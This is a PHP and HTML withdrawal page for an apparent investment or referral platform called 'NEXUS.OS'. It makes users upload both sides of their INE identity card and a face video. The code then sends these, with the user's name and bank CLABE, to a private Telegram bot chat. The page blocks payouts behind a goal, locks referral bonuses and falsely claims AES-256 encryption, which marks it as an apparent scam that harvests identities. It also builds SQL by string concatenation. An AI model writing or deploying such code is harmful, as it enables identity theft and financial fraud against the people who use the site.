<?php 
require '../includes/config.php'; 
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION['user_id'];

// Consultar datos del usuario y su meta
$res = $conn->query("SELECT * FROM usuarios WHERE id = $user_id");
$user = $res->fetch_assoc();

$saldo_retirable = $user['saldo_congelado'] ?? 0;
$meta_objetivo = ($user['meta_objetivo'] > 0) ? $user['meta_objetivo'] : 1;

// --- LÓGICA DE BLOQUEO POR META ---
if ($saldo_retirable < $meta_objetivo) {
    header("Location: ../includes/dashboard.php?error=insufficient_funds");
    exit();
}

$cuentas = $conn->query("SELECT * FROM datos_bancarios WHERE usuario_id = $user_id");

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['ine_frontal'])) {
    
    $monto = $_POST['monto_retirar'];
    $banco = !empty($_POST['banco_nombre']) ? $_POST['banco_nombre'] : "Cuenta Guardada";
    $clabe = $_POST['clabe_retiro'];

    // 1. REGISTRAR SOLICITUD EN BASE DE DATOS
    $stmt = $conn->prepare("INSERT INTO retiros (usuario_id, monto, banco, clabe, estado, fecha) VALUES (?, ?, ?, ?, 'pendiente_autorizacion', NOW())");
    $stmt->bind_param("idss", $user_id, $monto, $banco, $clabe);
    $stmt->execute();
    $id_retiro = $conn->insert_id;

    // 2. CONFIGURACIÓN TELEGRAM (Sustituye con tus credenciales)
    $bot_token = "TU_BOT_TOKEN"; 
    $chat_id = "TU_CHAT_ID"; 

    $msg = "🔔 **SOLICITUD DE RETIRO #$id_retiro**\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 **Usuario:** " . $user['nombre'] . " (ID: $user_id)\n";
    $msg .= "💰 **Monto:** $" . number_format($monto, 2) . " MXN\n";
    $msg .= "🏛 **Banco:** $banco\n";
    $msg .= "🔢 **CLABE:** `$clabe`\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "⚠️ *Verifica los archivos adjuntos antes de proceder.*";

    // Enviar archivos y video como grupo de medios
    $post_fields = [
        'chat_id' => $chat_id,
        'media'   => json_encode([
            ['type' => 'photo', 'media' => 'attach://f', 'caption' => $msg, 'parse_mode' => 'Markdown'],
            ['type' => 'photo', 'media' => 'attach://t'],
            ['type' => 'video', 'media' => 'attach://v']
        ]),
        'f' => new CURLFile($_FILES['ine_frontal']['tmp_name']),
        't' => new CURLFile($_FILES['ine_trasera']['tmp_name']),
        'v' => new CURLFile($_FILES['video_facial']['tmp_name'])
    ];

    $ch = curl_init("https://api.telegram.org/bot$bot_token/sendMediaGroup");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    $success_sent = true;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retiros | NEXUS.OS</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #030712; --card: #0f172a; --nexus: #0ea5e9; --green: #10b981; }
        body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #f1f5f9; }
        .mono { font-family: 'JetBrains Mono', monospace; }
        .nexus-card { background: var(--card); border: 1px solid rgba(14, 165, 233, 0.15); border-radius: 24px; }
        .balance-box { background: rgba(255,255,255,0.02); border-radius: 16px; padding: 15px; border: 1px solid rgba(255,255,255,0.05); }
        .locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
        .file-upload { 
            background: rgba(14, 165, 233, 0.03); 
            border: 2px dashed rgba(14, 165, 233, 0.3); 
            border-radius: 14px; padding: 20px; 
            cursor: pointer; text-align: center; transition: 0.3s; 
        }
        .file-upload:hover { background: rgba(14, 165, 233, 0.08); border-color: var(--nexus); }
        .btn-withdraw { 
            background: var(--nexus); color: #000; border-radius: 14px; 
            padding: 18px; font-weight: 800; border: none; width: 100%; 
            text-transform: uppercase; letter-spacing: 1px; transition: 0.3s;
        }
        .btn-withdraw:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(14, 165, 233, 0.3); }
    </style>
</head>
<body class="py-5">

<div class="container" style="max-width: 750px;">
    
    <div class="mb-5 d-flex align-items-center justify-content-between">
        <div class="d-flex align-items-center">
            <a href="../includes/dashboard.php" class="btn btn-outline-secondary btn-sm me-3" style="border-radius: 10px;"><i class="fas fa-chevron-left"></i></a>
            <h3 class="fw-800 m-0 mono">WITHDRAWAL_SERVICE</h3>
        </div>
        <span class="badge bg-success bg-opacity-10 text-success border border-success border-opacity-25 py-2 px-3">
            <i class="fas fa-shield-check me-1"></i> META_VERIFIED
        </span>
    </div>

    <?php if(isset($success_sent)): ?>
        <div class="alert bg-info bg-opacity-5 text-info border-info border-opacity-20 mb-4 py-4" style="border-radius: 20px;">
            <h6 class="fw-bold"><i class="fas fa-hourglass-half me-2"></i> SOLICITUD EN COLA DE PROCESAMIENTO</h6>
            <p class="small mb-0 opacity-75">Tu ID de retiro es #<?php echo $id_retiro; ?>. El departamento financiero auditará tus pruebas biométricas. Recibirás una notificación en cuanto el estado cambie a "Completado".</p>
        </div>
    <?php endif; ?>

    <div class="row g-3 mb-4">
        <div class="col-md-6">
            <div class="balance-box border-start border-info border-4">
                <small class="text-muted d-block mono small">RETIRABLE_AMOUNT</small>
                <h3 class="fw-800 text-white mb-0">$<?php echo number_format($saldo_retirable, 2); ?></h3>
            </div>
        </div>
        <div class="col-md-6">
            <div class="balance-box locked">
                <small class="text-muted d-block mono small">NETWORK_BONUS (LOCKED)</small>
                <h3 class="fw-800 text-white mb-0">$<?php echo number_format($user['saldo_referidos'] ?? 0, 2); ?></h3>
            </div>
        </div>
    </div>

    <div class="nexus-card p-4 shadow-lg">
        <form action="" method="POST" enctype="multipart/form-data">
            
            <p class="text-info small fw-bold mb-3 mono">01_DESTINATION_SETUP</p>
            
            <div class="mb-5">
                <select class="form-select bg-dark border-secondary text-white mb-3 py-3" name="metodo" id="metodo" onchange="toggleForm()" style="border-radius: 12px;">
                    <option value="guardada">Utilizar cuenta guardada</option>
                    <option value="nueva">Nueva CLABE Interbancaria</option>
                </select>

                <div id="div_guardada">
                    <?php if($cuentas && $cuentas->num_rows > 0): ?>
                        <?php while($c = $cuentas->fetch_assoc()): ?>
                            <div class="form-check p-3 border border-secondary border-opacity-25 rounded-3 mb-2 bg-black bg-opacity-20">
                                <input class="form-check-input" type="radio" name="clabe_retiro" value="<?php echo $c['clabe']; ?>" checked>
                                <label class="form-check-label text-white ms-2 small">
                                    <?php echo $c['banco_nombre']; ?> | <span class="mono">••••<?php echo substr($c['clabe'], -4); ?></span>
                                </label>
                            </div>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <div class="p-3 border border-warning border-opacity-20 rounded-3 text-warning small">
                            <i class="fas fa-exclamation-triangle me-2"></i> No se encontraron cuentas pre-registradas.
                        </div>
                    <?php endif; ?>
                </div>

                <div id="div_nueva" style="display:none;">
                    <div class="row g-2">
                        <div class="col-12"><input type="text" name="banco_nombre" class="form-control bg-dark border-secondary text-white py-3" placeholder="Institución Bancaria" style="border-radius: 12px;"></div>
                        <div class="col-12"><input type="text" name="clabe_retiro" class="form-control bg-dark border-secondary text-white py-3 mono" placeholder="CLABE (18 DÍGITOS)" style="border-radius: 12px;"></div>
                    </div>
                </div>
            </div>

            <p class="text-info small fw-bold mb-3 mono">02_BIOMETRIC_PROOF</p>
            <div class="row g-3 mb-5">
                <div class="col-6">
                    <label class="file-upload d-block" id="label-f">
                        <i class="fas fa-id-card fa-2xl mb-2 opacity-50"></i><br>
                        <span class="small mono">INE_FRONT</span>
                        <input type="file" name="ine_frontal" hidden required accept="image/*" onchange="markLoaded('label-f')">
                    </label>
                </div>
                <div class="col-6">
                    <label class="file-upload d-block" id="label-t">
                        <i class="fas fa-id-card fa-2xl mb-2 opacity-50"></i><br>
                        <span class="small mono">INE_BACK</span>
                        <input type="file" name="ine_trasera" hidden required accept="image/*" onchange="markLoaded('label-t')">
                    </label>
                </div>
                <div class="col-12">
                    <label class="file-upload d-block" id="label-v">
                        <i class="fas fa-video fa-2xl mb-2 opacity-50"></i><br>
                        <span class="small mono">IDENTITY_VIDEO_VERIFICATION</span>
                        <input type="file" name="video_facial" hidden required accept="video/*" onchange="markLoaded('label-v')">
                    </label>
                </div>
            </div>

            <input type="hidden" name="monto_retirar" value="<?php echo $saldo_retirable; ?>">
            <button type="submit" class="btn-withdraw mono">EXECUTE_WITHDRAWAL_REQUEST</button>
            
            <div class="text-center mt-4">
                <small class="text-muted opacity-50 mono" style="font-size: 10px;">
                    SECURE_SESSION: <?php echo session_id(); ?><br>
                    ALL DATA ENCRYPTED AES-256
                </small>
            </div>
        </form>
    </div>
</div>

<script>
function toggleForm() {
    let m = document.getElementById('metodo').value;
    document.getElementById('div_guardada').style.display = (m == 'guardada') ? 'block' : 'none';
    document.getElementById('div_nueva').style.display = (m == 'nueva') ? 'block' : 'none';
}
function markLoaded(id) {
    document.getElementById(id).style.borderColor = '#10b981';
    document.getElementById(id).style.background = 'rgba(16, 185, 129, 0.1)';
    document.getElementById(id).querySelector('i').style.color = '#10b981';
    document.getElementById(id).querySelector('i').classList.replace('opacity-50', 'opacity-100');
}
</script>

</body>
</html>
